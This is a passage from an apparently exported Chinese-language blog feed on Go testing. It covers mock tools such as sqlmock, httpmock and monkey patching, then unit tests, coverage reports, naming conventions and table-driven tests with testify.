title="Mock工具"></a>Mock工具</h3><p>这篇文章介绍了Go官方提供的Mock框架GoMock，不过还有一些其他的优秀Mock工具可供我们使用。这些Mock工具分别用在不同的Mock场景中</p><ul><li><a href="https://github.com/DATA-DOG/go-sqlmock">sqlmock</a>：可以用来模拟数据库连接。数据库是项目中比较常见的依赖，在遇到数据库依赖时都可以用它。</li><li><a href="https://github.com/jarcoal/httpmock">httpmock</a>：可以用来Mock HTTP请求。</li><li><a href="https://github.com/bouk/monkey">bouk&#x2F;monkey</a>：猴子补丁，能够通过替换函数指针的方式来修改任意函数的实现。如果golang&#x2F;mock、sqlmock和httpmock这几种方法都不能满足我们的需求，我们可以尝试用猴子补丁的方式来Mock依赖。可以这么说，猴子补丁提供了单元测试 Mock 依赖的最终解决方案。</li></ul><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这一篇文章介绍了除单元测试和性能测试之外的另一些测试方法。</p><p>除了示例测试和TestMain函数，我还详细介绍了Mock测试，也就是如何使用GoMock来测试一些在单元测试环境下不好实现的接口。绝大部分情况下，可以使用GoMock来Mock接口，但是对于一些业务逻辑比较复杂的接口，我们可以通过Fake一个接口实现，来对代码进行测试，这也称为Fake测试。</p><p>除此之外，我们还可以使用其他一些测试框架，例如Testify框架和GoConvey框架。在Go代码测试中，我们最常使用的是Go官方提供的Mock框架GoMock，但仍然有其他优秀的Mock工具，可供我们在不同场景下使用，例如sqlmock、httpmock、bouk&#x2F;monkey等。</p>]]></content>
    
    
    <categories>
      
      <category>golang</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
      <tag>golang</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Go 代码测试（上）：如何编写 Go 语言单元测试和性能测试用例？</title>
    <link href="/2022/11/30/Go%E4%BB%A3%E7%A0%81%E6%B5%8B%E8%AF%95%EF%BC%88%E4%B8%8A%EF%BC%89%EF%BC%9A%E5%A6%82%E4%BD%95%E7%BC%96%E5%86%99Go%E8%AF%AD%E8%A8%80%E5%8D%95%E5%85%83%E6%B5%8B%E8%AF%95%E5%92%8C%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95%E7%94%A8%E4%BE%8B%EF%BC%9F/"/>
    <url>/2022/11/30/Go%E4%BB%A3%E7%A0%81%E6%B5%8B%E8%AF%95%EF%BC%88%E4%B8%8A%EF%BC%89%EF%BC%9A%E5%A6%82%E4%BD%95%E7%BC%96%E5%86%99Go%E8%AF%AD%E8%A8%80%E5%8D%95%E5%85%83%E6%B5%8B%E8%AF%95%E5%92%8C%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95%E7%94%A8%E4%BE%8B%EF%BC%9F/</url>
    
    <content type="html"><![CDATA[ <meta name="referrer" content="no-referrer"># Go 代码测试（上）：如何编写 Go 语言单元测试和性能测试用例？<blockquote><p>本文章主要内容引用自：1.孔令飞，<a href="https://time.geekbang.org/column/article/410205">Go 语言项目开发实战</a>  </p></blockquote><p>在Go项目开发中，我们不仅要开发功能，更重要的是确保这些功能稳定可靠，并且拥有一个不错的性能。要确保这些，就要对代码进行测试。开发人员通常会进行单元测试和性能测试，分别用来测试代码的功能是否正常和代码的性能是否满足需求。</p><p>每种语言通常都有自己的测试包&#x2F;模块，Go语言也不例外。在Go中，我们可以通过 <code>testing</code> 包对代码进行单元测试和性能测试。在这篇文章中会用一些示例来讲解如何编写单元测试和性能测试用例，下一讲则会深入了解单元测试其他类型及项目测试实战</p><h2 id="何时编写和执行单元测试用例？"><a href="#何时编写和执行单元测试用例？" class="headerlink" title="何时编写和执行单元测试用例？"></a>何时编写和执行单元测试用例？</h2><h3 id="编码前：TDD"><a href="#编码前：TDD" class="headerlink" title="编码前：TDD"></a>编码前：TDD</h3><p><img src="https://static001.geekbang.org/resource/image/48/b2/4830b21b55d194eccf1ec74637ee3eb2.png?wh=538x516" alt="img"></p><p>Test-Driven Development，也就是测试驱动开发，是敏捷开发的⼀项核心实践和技术，也是⼀种设计方法论。简单来说，TDD原理就是：开发功能代码之前，先编写测试用例代码，然后针对测试用例编写功能代码，使其能够通过。这样做的好处在于，通过测试的执行代码肯定满足需求，而且有助于面向接口编程，降低代码耦合，也极大降低了bug的出现几率。</p><p>然而，TDD的坏处也显而易见：由于测试用例是在进行代码设计之前写的，很有可能限制开发者对代码的整体设计；并且，由于TDD对开发⼈员要求非常高，体现的思想跟传统开发思维也不⼀样，因此实施起来比较困难；此外，因为要先编写测试用例，TDD也可能会影响项目的研发进度。所以，在客观情况不满足的情况下，不应该盲目追求对业务代码使用TDD的开发模式。</p><h3 id="与编码同步进行：增量"><a href="#与编码同步进行：增量" class="headerlink" title="与编码同步进行：增量"></a>与编码同步进行：增量</h3><p>及时为增量代码写单测是一种良好的习惯。一方面是因为，此时我们对需求有一定的理解，能够更好地写出单元测试来验证正确性。并且，在单测阶段就发现问题，而不是等到联调测试中才发现，修复的成本也是最小的。</p><p>另一方面，在写单测的过程中，我们也能够反思业务代码的正确性、合理性，推动我们在实现的过程中更好地反思代码的设计，并及时调整。</p><h3 id="编码后：存量"><a href="#编码后：存量" class="headerlink" title="编码后：存量"></a>编码后：存量</h3><p>在完成业务需求后，我们可能会遇到这种情况：因为上线时间比较紧张、没有单测相关规划，开发阶段只手动测试了代码是否符合功能。</p><p>如果这部分存量代码出现较大的新需求，或者维护已经成为问题，需要大规模重构，这正是推动补全单测的好时机。为存量代码补充上单测，一方面能够推进重构者进一步理解原先的逻辑，另一方面也能够增强重构者重构代码后的信心，降低风险。</p><p>但是，补充存量单测可能需要再次回忆理解需求和逻辑设计等细节，而有时写单测的人并不是原编码的设计者，所以编码后编写和执行单元测试用例也有一定的不足。</p><h2 id="测试覆盖率"><a href="#测试覆盖率" class="headerlink" title="测试覆盖率"></a>测试覆盖率</h2><p>我们写单元测试的时候应该想得很全面，能够覆盖到所有的测试用例，但有时也会漏过一些 case，Go提供了cover工具来统计测试覆盖率。具体可以分为两大步骤。</p><p>第一步，生成测试覆盖率数据：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ go <span class="hljs-built_in">test</span> -coverprofile=coverage.out<br><span class="hljs-keyword">do</span> some setup<br>PASS<br>coverage: 40.0% of statements<br><span class="hljs-keyword">do</span> some cleanup<br>ok  github.com/marmotedu/gopractise-demo/test0.003s<br><br></code></pre></td></tr></table></figure><p>上面的命令在当前目录下生成了 <code>coverage.out</code> 覆盖率数据文件。</p><p><img src="https://static001.geekbang.org/resource/image/3c/01/3c11a0d41d6ed736f364c1693a2eff01.png?wh=1920x366" alt="img"></p><p>第二步，分析覆盖率文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ go tool cover -func=coverage.out<br><span class="hljs-keyword">do</span> some setup<br>PASS<br>coverage: 40.0% of statements<br><span class="hljs-keyword">do</span> some cleanup<br>ok  github.com/marmotedu/gopractise-demo/test0.003s<br>[colin@dev <span class="hljs-built_in">test</span>]$ go tool cover -func=coverage.out<br>github.com/marmotedu/gopractise-demo/test/math.go:9:Abs100.0%<br>github.com/marmotedu/gopractise-demo/test/math.go:14:Max100.0%<br>github.com/marmotedu/gopractise-demo/test/math.go:19:Min0.0%<br>github.com/marmotedu/gopractise-demo/test/math.go:24:RandInt0.0%<br>github.com/marmotedu/gopractise-demo/test/math.go:29:Floor0.0%<br>total:(statements)40.0%<br><br></code></pre></td></tr></table></figure><p>在上述命令的输出中，我们可以查看到哪些函数没有测试，哪些函数内部的分支没有测试完全。cover工具会根据被执行代码的行数与总行数的比例计算出覆盖率。可以看到，Abs和Max函数的测试覆盖率为100%，Min和RandInt的测试覆盖率为0。</p><p>我们还可以使用 <code>go tool cover -html</code> 生成 <code>HTML</code> 格式的分析文件，可以更加清晰地展示代码的测试情况：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ go tool cover -html=coverage.out -o coverage.html<br><br></code></pre></td></tr></table></figure><p>上述命令会在当前目录下生成一个 <code>coverage.html</code> 文件，用浏览器打开 <code>coverage.html</code> 文件，可以更加清晰地看到代码的测试情况，如下图所示：</p><p><img src="https://static001.geekbang.org/resource/image/f0/5e/f089f5d44ba06f052c1c46c858c2b75e.png?wh=1524x1075" alt="img"></p><p>通过上图，我们可以知道红色部分的代码没有被测试到，可以让我们接下来有针对性地添加测试用例，而不是一头雾水，不知道需要为哪些代码编写测试用例。</p><p>在Go项目开发中，我们往往会把测试覆盖率作为代码合并的一个强制要求，所以需要在进行代码测试时，同时生成代码覆盖率数据文件。在进行代码测试时，可以通过分析该文件，来判断我们的代码测试覆盖率是否满足要求，如果不满足则代码测试失败。</p><h2 id="如何测试-Go-代码？"><a href="#如何测试-Go-代码？" class="headerlink" title="如何测试 Go 代码？"></a>如何测试 Go 代码？</h2><p>Go语言有自带的测试框架 <code>testing</code>，可以用来实现单元测试（T类型）和性能测试（B类型），通过 <code>go test</code> 命令来执行单元测试和性能测试。</p><p>go test 执行测试用例时，是以go包为单位进行测试的。执行时需要指定包名，比如 <code>go test 包名</code>，如果没有指定包名，默认会选择执行命令时所在的包。go test在执行时，会遍历以 <code>_test.go</code> 结尾的源码文件，执行其中以 <code>Test</code>、 <code>Benchmark</code>、 <code>Example</code> 开头的测试函数。</p><p>为了演示如何编写测试用例，预先编写了4个函数。假设这些函数保存在test目录下的 <code>math.go</code> 文件中，包名为 <code>test</code>，math.go代码如下：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> test<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;fmt&quot;</span><br><span class="hljs-string">&quot;math&quot;</span><br><span class="hljs-string">&quot;math/rand&quot;</span><br>)<br><br><span class="hljs-comment">// Abs returns the absolute value of x.</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Abs</span><span class="hljs-params">(x <span class="hljs-type">float64</span>)</span></span> <span class="hljs-type">float64</span> &#123;<br><span class="hljs-keyword">return</span> math.Abs(x)<br>&#125;<br><br><span class="hljs-comment">// Max returns the larger of x or y.</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Max</span><span class="hljs-params">(x, y <span class="hljs-type">float64</span>)</span></span> <span class="hljs-type">float64</span> &#123;<br><span class="hljs-keyword">return</span> math.Max(x, y)<br>&#125;<br><br><span class="hljs-comment">// Min returns the smaller of x or y.</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Min</span><span class="hljs-params">(x, y <span class="hljs-type">float64</span>)</span></span> <span class="hljs-type">float64</span> &#123;<br><span class="hljs-keyword">return</span> math.Min(x, y)<br>&#125;<br><br><span class="hljs-comment">// RandInt returns a non-negative pseudo-random int from the default Source.</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">RandInt</span><span class="hljs-params">()</span></span> <span class="hljs-type">int</span> &#123;<br><span class="hljs-keyword">return</span> rand.Int()<br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="测试命名规范"><a href="#测试命名规范" class="headerlink" title="测试命名规范"></a>测试命名规范</h2><p>在我们对Go代码进行测试时，需要编写测试文件、测试函数、测试变量，它们都需要遵循一定的规范。这些规范有些来自于官方，有些则来自于社区。这里，分别介绍下测试文件、包、测试函数和测试变量的命名规范。</p><h3 id="测试文件的命名规范"><a href="#测试文件的命名规范" class="headerlink" title="测试文件的命名规范"></a>测试文件的命名规范</h3><p>Go的测试文件名必须以 <code>_test.go</code> 结尾。例如，如果我们有一个名为 <code>person.go</code> 的文件，那它的测试文件必须命名为 <code>person_test.go</code>。这样做是因为，Go需要区分哪些文件是测试文件。这些测试文件可以被go test命令行工具加载，用来测试我们编写的代码，但会被Go的构建程序忽略掉，因为Go程序的运行不需要这些测试代码。</p><h3 id="包的命名规范"><a href="#包的命名规范" class="headerlink" title="包的命名规范"></a>包的命名规范</h3><p>Go的测试可以分为白盒测试和黑盒测试。</p><ul><li><strong>白盒测试：</strong> 将测试和生产代码放在同一个Go包中，这使我们可以同时测试Go包中可导出和不可导出的标识符。当我们编写的单元测试需要访问Go包中不可导出的变量、函数和方法时，就需要编写白盒测试用例。</li><li><strong>黑盒测试：</strong> 将测试和生产代码放在不同的Go包中。这时，我们仅可以测试Go包的可导出标识符。这意味着我们的测试包将无法访问生产代码中的任何内部函数、变量或常量。</li></ul><p>在白盒测试中，Go的测试包名称需要跟被测试的包名保持一致，例如： <code>person.go</code> 定义了一个 <code>person</code> 包，则 <code>person_test.go</code> 的包名也要为 <code>person</code>，这也意味着 <code>person.go</code> 和 <code>person_test.go</code> 都要在同一个目录中。</p><p>在黑盒测试中，Go的测试包名称需要跟被测试的包名不同，但仍然可以存放在同一个目录下。比如， <code>person.go</code> 定义了一个 <code>person</code> 包，则 <code>person_test.go</code> 的包名需要跟 <code>person</code> 不同，通常我们命名为 <code>person_test</code>。</p><p>如果不是需要使用黑盒测试，我们在做单元测试时要尽量使用白盒测试。一方面，这是go test工具的默认行为；另一方面，使用白盒测试，我们可以测试和使用不可导出的标识符。</p><p>测试文件和包的命名规范，由Go语言及go test工具来强制约束。</p><h3 id="函数的命名规范"><a href="#函数的命名规范" class="headerlink" title="函数的命名规范"></a>函数的命名规范</h3><p>测试用例函数必须以 <code>Test</code>、 <code>Benchmark</code>、 <code>Example</code> 开头，例如 <code>TestXxx</code>、 <code>BenchmarkXxx</code>、 <code>ExampleXxx</code>， <code>Xxx</code> 部分为任意字母数字的组合，首字母大写。这是由Go语言和go test工具来进行约束的， <code>Xxx</code> 一般是需要测试的函数名。</p><p>除此之外，还有一些社区的约束，这些约束不是强制的，但是遵循这些约束会让我们的测试函数名更加易懂。例如，我们有以下函数：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">type</span> Person <span class="hljs-keyword">struct</span> &#123;<br>age  <span class="hljs-type">int64</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(p *Person)</span></span> older(other *Person) <span class="hljs-type">bool</span> &#123;<br><span class="hljs-keyword">return</span> p.age &gt; other.age<br>&#125;<br><br></code></pre></td></tr></table></figure><p>很显然，我们可以把测试函数命名为 <code>TestOlder</code>，这个名称可以很清晰地说明它是 <code>Older</code> 函数的测试用例。但是，如果我们想用多个测试用例来测试 <code>TestOlder</code> 函数，这些测试用例该如何命名呢？也许你会说，我们命名为 <code>TestOlder1</code>、 <code>TestOlder2</code> 不就行了？</p><p>其实，还有其他更好的命名方法。比如，这种情况下，我们可以将函数命名为 <code>TestOlderXxx</code>，其中 <code>Xxx</code> 代表 <code>Older</code> 函数的某个场景描述。例如， <code>strings.Compare</code> 函数有如下测试函数： <code>TestCompare</code>、 <code>TestCompareIdenticalString</code>、 <code>TestCompareStrings</code>。</p><h3 id="变量的命名规范"><a href="#变量的命名规范" class="headerlink" title="变量的命名规范"></a>变量的命名规范</h3><p>Go语言和go test没有对变量的命名做任何约束。但是，在编写单元测试用例时，还是有一些规范值得我们去遵守。</p><p>单元测试用例通常会有一个实际的输出，在单元测试中，我们会将预期的输出跟实际的输出进行对比，来判断单元测试是否通过。为了清晰地表达函数的实际输出和预期输出，可以将这两类输出命名为 <code>expected/actual</code>，或者 <code>got/want</code>。例如：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">if</span> c.expected != actual &#123;<br>  t.Fatalf(<span class="hljs-string">&quot;Expected User-Agent &#x27;%s&#x27; does not match &#x27;%s&#x27;&quot;</span>, c.expected, actual)<br>&#125;<br><br></code></pre></td></tr></table></figure><p>或者：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">if</span> got, want := diags[<span class="hljs-number">3</span>].Description().Summary, undeclPlural; got != want &#123;<br>  t.Errorf(<span class="hljs-string">&quot;wrong summary for diagnostic 3\ngot:  %s\nwant: %s&quot;</span>, got, want)<br>&#125;<br><br></code></pre></td></tr></table></figure><p>其他的变量命名，我们可以遵循Go语言推荐的变量命名方法，例如：</p><ul><li>Go中的变量名应该短而不是长，对于范围有限的局部变量来说尤其如此。</li><li>变量离声明越远，对名称的描述性要求越高。</li><li>像循环、索引之类的变量，名称可以是单个字母（i）。如果是不常见的变量和全局变量，变量名就需要具有更多的描述性。</li></ul><p>上面，我介绍了Go测试的一些基础知识。接下来，我们来看看如何编写单元测试用例和性能测试用例。</p><h2 id="单元测试"><a href="#单元测试" class="headerlink" title="单元测试"></a>单元测试</h2><p>单元测试用例函数以 <code>Test</code> 开头，例如 <code>TestXxx</code> 或 <code>Test_xxx</code> （ <code>Xxx</code> 部分为任意字母数字组合，首字母大写）。函数参数必须是 <code>*testing.T</code>，可以使用该类型来记录错误或测试状态。</p><p>我们可以调用 <code>testing.T</code> 的 <code>Error</code> 、 <code>Errorf</code> 、 <code>FailNow</code> 、 <code>Fatal</code> 、 <code>FatalIf</code> 方法，来说明测试不通过；调用 <code>Log</code> 、 <code>Logf</code> 方法来记录测试信息。函数列表和相关描述如下表所示：</p><p><img src="https://static001.geekbang.org/resource/image/b3/ab/b374d392abfe62459d2c22e6ff76c0ab.jpg?wh=1920x1570" alt="img"></p><p>下面的代码是两个简单的单元测试函数（函数位于文件 <a href="https://github.com/marmotedu/gopractise-demo">math_test.go</a> 中）：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">TestAbs</span><span class="hljs-params">(t *testing.T)</span></span> &#123;<br>    got := Abs(<span class="hljs-number">-1</span>)<br>    <span class="hljs-keyword">if</span> got != <span class="hljs-number">1</span> &#123;<br>        t.Errorf(<span class="hljs-string">&quot;Abs(-1) = %f; want 1&quot;</span>, got)<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">TestMax</span><span class="hljs-params">(t *testing.T)</span></span> &#123;<br>    got := Max(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>)<br>    <span class="hljs-keyword">if</span> got != <span class="hljs-number">2</span> &#123;<br>        t.Errorf(<span class="hljs-string">&quot;Max(1, 2) = %f; want 2&quot;</span>, got)<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>执行 <code>go test</code> 命令来执行如上单元测试用例：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs go">$ <span class="hljs-keyword">go</span> test<br>PASS<br>ok      github.com/marmotedu/gopractise-demo/<span class="hljs-number">31</span>/test    <span class="hljs-number">0.002</span>s<br><br></code></pre></td></tr></table></figure><p><code>go test</code> 命令自动搜集所有的测试文件，也就是格式为 <code>*_test.go</code> 的文件，从中提取全部测试函数并执行。</p><p>go test还支持下面三个参数。</p><ul><li>-v，显示所有测试函数的运行细节：</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs go">$ <span class="hljs-keyword">go</span> test -v<br>=== RUN   TestAbs<br>--- PASS: TestAbs (<span class="hljs-number">0.00</span>s)<br>=== RUN   TestMax<br>--- PASS: TestMax (<span class="hljs-number">0.00</span>s)<br>PASS<br>ok      github.com/marmotedu/gopractise-demo/<span class="hljs-number">31</span>/test    <span class="hljs-number">0.002</span>s<br><br></code></pre></td></tr></table></figure><ul><li>-run &lt; regexp&gt;，指定要执行的测试函数：</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs go">$ <span class="hljs-keyword">go</span> test -v -run=<span class="hljs-string">&#x27;TestA.*&#x27;</span><br>=== RUN   TestAbs<br>--- PASS: TestAbs (<span class="hljs-number">0.00</span>s)<br>PASS<br>ok      github.com/marmotedu/gopractise-demo/<span class="hljs-number">31</span>/test    <span class="hljs-number">0.001</span>s<br><br></code></pre></td></tr></table></figure><p>上面的例子中，我们只运行了以 <code>TestA</code> 开头的测试函数。</p><ul><li>-count N，指定执行测试函数的次数：</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs go">$ <span class="hljs-keyword">go</span> test -v -run=<span class="hljs-string">&#x27;TestA.*&#x27;</span> -count=<span class="hljs-number">2</span><br>=== RUN   TestAbs<br>--- PASS: TestAbs (<span class="hljs-number">0.00</span>s)<br>=== RUN   TestAbs<br>--- PASS: TestAbs (<span class="hljs-number">0.00</span>s)<br>PASS<br>ok      github.com/marmotedu/gopractise-demo/<span class="hljs-number">31</span>/test    <span class="hljs-number">0.002</span>s<br><br></code></pre></td></tr></table></figure><h3 id="多个输入的测试用例"><a href="#多个输入的测试用例" class="headerlink" title="多个输入的测试用例"></a>多个输入的测试用例</h3><p>前面介绍的单元测试用例只有一个输入，但是很多时候，我们需要测试一个函数在多种不同输入下是否能正常返回。这时候，我们可以编写一个稍微复杂点的测试用例，用来支持多输入下的用例测试。例如，我们可以将 <code>TestAbs</code> 改造成如下函数：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">TestAbs_2</span><span class="hljs-params">(t *testing.T)</span></span> &#123;<br>    tests := []<span class="hljs-keyword">struct</span> &#123;<br>        x    <span class="hljs-type">float64</span><br>        want <span class="hljs-type">float64</span><br>    &#125;&#123;<br>        &#123;<span class="hljs-number">-0.3</span>, <span class="hljs-number">0.3</span>&#125;,<br>        &#123;<span class="hljs-number">-2</span>, <span class="hljs-number">2</span>&#125;,<br>        &#123;<span class="hljs-number">-3.1</span>, <span class="hljs-number">3.1</span>&#125;,<br>        &#123;<span class="hljs-number">5</span>, <span class="hljs-number">5</span>&#125;,<br>    &#125;<br><br>    <span class="hljs-keyword">for</span> _, tt := <span class="hljs-keyword">range</span> tests &#123;<br>        <span class="hljs-keyword">if</span> got := Abs(tt.x); got != tt.want &#123;<br>            t.Errorf(<span class="hljs-string">&quot;Abs() = %f, want %v&quot;</span>, got, tt.want)<br>        &#125;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>上述测试用例函数中，我们定义了一个结构体数组，数组中的每一个元素代表一次测试用例。数组元素的的值包含输入和预期的返回值：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs go">tests := []<span class="hljs-keyword">struct</span> &#123;<br>    x    <span class="hljs-type">float64</span><br>    want <span class="hljs-type">float64</span><br>&#125;&#123;<br>    &#123;<span class="hljs-number">-0.3</span>, <span class="hljs-number">0.3</span>&#125;,<br>    &#123;<span class="hljs-number">-2</span>, <span class="hljs-number">2</span>&#125;,<br>    &#123;<span class="hljs-number">-3.1</span>, <span class="hljs-number">3.1</span>&#125;,<br>    &#123;<span class="hljs-number">5</span>, <span class="hljs-number">5</span>&#125;,<br>&#125;<br><br></code></pre></td></tr></table></figure><p>上述测试用例，将被测函数放在for循环中执行：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">for</span> _, tt := <span class="hljs-keyword">range</span> tests &#123;<br>     <span class="hljs-keyword">if</span> got := Abs(tt.x); got != tt.want &#123;<br>         t.Errorf(<span class="hljs-string">&quot;Abs() = %f, want %v&quot;</span>, got, tt.want)<br>     &#125;<br> &#125;<br><br></code></pre></td></tr></table></figure><p>上面的代码将输入传递给被测函数，并将被测函数的返回值跟预期的返回值进行比较。如果相等，则说明此次测试通过，如果不相等则说明此次测试不通过。通过这种方式，我们就可以在一个测试用例中，测试不同的输入和输出，也就是不同的测试用例。如果要新增一个测试用例，根据需要添加输入和预期的返回值就可以了，这些测试用例都共享其余的测试代码。</p><p>上面的测试用例中，我们通过 <code>got != tt.want</code> 来对比实际返回结果和预期返回结果。我们也可以使用 <code>github.com/stretchr/testify/assert</code> 包中提供的函数来做结果对比，例如：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">TestAbs_3</span><span class="hljs-params">(t *testing.T)</span></span> &#123;<br>    tests := []<span class="hljs-keyword">struct</span> &#123;<br>        x    <span class="hljs-type">float64</span><br>        want <span class="hljs-type">float64</span><br>    &#125;&#123;<br>        &#123;<span class="hljs-number">-0.3</span>, <span class="hljs-number">0.3</span>&#125;,<br>        &#123;<span class="hljs-number">-2</span>, <span class="hljs-number">2</span>&#125;,<br>        &#123;<span class="hljs-number">-3.1</span>, <span class="hljs-number">3.1</span>&#125;,<br>        &#123;<span class="hljs-number">5</span>, <span class="hljs-number">5</span>&#125;,<br>    &#125;<br><br>    <span class="hljs-keyword">for</span> _, tt := <span class="hljs-keyword">range</span> tests &#123;<br>        got := Abs(tt.x)<br>        assert.Equal(t, got, tt.want)<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>使用 <code>assert</code> 来对比结果，有下面这些好处：</p><ul><li>友好的输出结果，易于阅读。</li><li>因为少了 <code>if got := Xxx(); got != tt.wang &#123;&#125;</code> 的判断，代码变得更加简洁。</li><li>可以针对每次断言，添加额外的消息说明，例如 <code>assert.Equal(t, got, tt.want, &quot;Abs test&quot;)</code>。</li></ul><p>assert包还提供了很多其他函数，供开发者进行结果对比，例如 <code>Zero</code>、 <code>NotZero</code>、 <code>Equal</code>、 <code>NotEqual</code>、 <code>Less</code>、 <code>True</code>、 <code>Nil</code>、 <code>NotNil</code> 等。如果想了解更多函数，你可以参考 <code>go doc github.com/stretchr/testify/assert</code>。</p><h3 id="自动生成单元测试用例"><a href="#自动生成单元测试用例" class="headerlink" title="自动生成单元测试用例"></a>自动生成单元测试用例</h3><p>通过上面的学习，你也许可以发现，测试用例其实可以抽象成下面的模型：</p><p><img src="https://static001.geekbang.org/resource/image/8f/fa/8f06e0a1bf2638a9255467a29e6dfcfa.jpg?wh=1920x688" alt="img"></p><p>用代码可表示为：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span 